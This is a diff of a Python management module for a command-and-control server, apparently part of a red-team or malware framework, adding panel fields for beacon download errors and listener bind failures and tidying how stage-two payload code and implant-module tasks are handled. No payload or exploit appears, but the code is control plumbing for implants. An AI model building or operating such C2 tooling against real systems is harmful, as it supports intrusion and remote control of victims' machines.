@@ -12,7 +12,7 @@ import json
 import os
 import sys
 import threading
-from datetime import datetime, timezone
+from datetime import timezone
 
 # C2 server 内部用 datetime.now()(服务器本地 naive 时间)记录时间戳,
 # 直接 isoformat() 输出无时区信息,前端 new Date() 会按访问者浏览器本地时区解析,
@@ -204,6 +204,8 @@ def _beacon_dict(rec) -> dict:
         "sys_user": rec.sys_user or "",
         "sys_os": rec.sys_os or "",
         "sys_platform": rec.sys_platform or "",
+        # R11:最近一次下载失败原因(面板详情直接显示,不用翻日志)
+        "dl_error": getattr(rec, "dl_error", "") or "",
         "tags": list(getattr(rec, "tags", []) or []),
         "via": getattr(rec, "via", "") or "直连",
         "is_fork": bool(getattr(rec, "is_fork", False)),
@@ -325,6 +327,15 @@ def build_module_task(name: str, args: list, platform: str = ""):
         try:
             task = server._dispatcher.build_task(name, list(args or []), platform=platform)
             if task is None:
+                # 区分 server 模块(存在于 s_modules,但不支持 dry-run 构建)与真正不存在
+                try:
+                    smod_names = {m.get("name") for m in server._dispatcher.smods.list_modules()
+                                  if isinstance(m, dict)}
+                except Exception:
+                    smod_names = set()
+                if name in smod_names:
+                    return False, (f"模块 {name} 是 server 模块, 不支持 dry-run 构建"
+                                   f"(dry-run 仅用于植入物模块)")
                 return False, f"模块 {name} 不存在"
             return True, task.code
         except Exception as exc:
@@ -607,14 +618,12 @@ def set_stage2(code: str) -> dict:
     with _C2_LOCK:
         server._config.stage_code = code
         path = _config_path_of(server)
-        saved = False
         if path:
             try:
                 with open(path, "r", encoding="utf-8") as f:
                     raw = json.load(f)
                 raw["stage_code"] = code
                 _atomic_save_json(path, raw)
-                saved = True
             except (OSError, ValueError) as e:
                 return {"ok": False,
                         "error": f"config.json 持久化失败: {e}(运行中已生效, 重启后丢失)"}
@@ -632,6 +641,8 @@ def status_detail() -> dict:
         cfg = server._config
         key_implant = bytes.fromhex(cfg.implant_key) if len(cfg.implant_key) == 64 else b""
         beacons = [r for r in server._mgr.list_clients() if not r.is_client]
+        # 监听器绑定失败明细(role → 错误文本)
+        listener_errs = dict(getattr(getattr(server, "_listener", None), "errors", {}) or {})
         total_pending = 0
         for r in beacons:
             total_pending += server._tq.pending_count(r.client_id)
@@ -643,7 +654,6 @@ def status_detail() -> dict:
                 "server_port": cfg.server_port,
                 "client_port": cfg.client_port,
                 "client_tls": bool(getattr(cfg, "client_tls", False)),
-                "client_timeout": cfg.client_timeout,
                 "beacon_expire_seconds": cfg.beacon_expire_seconds,
                 "max_tasks_per_client": cfg.max_tasks_per_client,
                 "max_results_per_beacon": cfg.max_results_per_beacon,
@@ -651,11 +661,16 @@ def status_detail() -> dict:
             },
             "implant_key_fp": key_implant.hex()[:8] + "…" + key_implant.hex()[-8:] if key_implant else "",
             "client_key_ready": bool(getattr(server, "_key_client", b"")),
+            # 端口绑定失败信息(2026-09-15 R12):bind 失败时面板能看到具体原因,
+            # 不再出现「显示已启动但根本没在听」
+            "listener_error": getattr(server, "listener_error", "") or "",
             "listeners": {
                 # enabled = 端口 > 0(端口 0 = 关闭该通道,2026-09-04)
-                "beacon": {"enabled": cfg.server_port > 0, "port": cfg.server_port},
+                "beacon": {"enabled": cfg.server_port > 0, "port": cfg.server_port,
+                           "error": listener_errs.get("beacon", "")},
                 "client": {"enabled": cfg.client_port > 0, "port": cfg.client_port,
-                           "ready": bool(getattr(server, "_key_client", b""))},
+                           "ready": bool(getattr(server, "_key_client", b"")),
+                           "error": listener_errs.get("client", "")},
             },
             "counts": {
                 "beacons": len(beacons),
@@ -858,7 +873,7 @@ def update_listener_config(updates: dict) -> tuple:
         return False, _C2_INIT_ERROR or "C2 未启动"
     cfg_path = _config_path_of(server)
     allowed = {"server_host", "server_port", "client_port", "client_tls",
-               "client_timeout", "beacon_expire_seconds",
+               "beacon_expire_seconds",
                "max_tasks_per_client", "max_results_per_beacon"}
     port_keys = {"server_port", "client_port"}
     with _C2_LOCK:
@@ -884,7 +899,7 @@ def update_listener_config(updates: dict) -> tuple:
                     v = int(v)
                     if not (0 <= v <= 65535):
                         return False, f"{k}: 端口须在 0-65535(0=关闭该通道),收到 {v!r}"
-                elif k in ("client_timeout", "beacon_expire_seconds",
+                elif k in ("beacon_expire_seconds",
                            "max_tasks_per_client", "max_results_per_beacon"):
                     v = int(v)
             except (TypeError, ValueError):
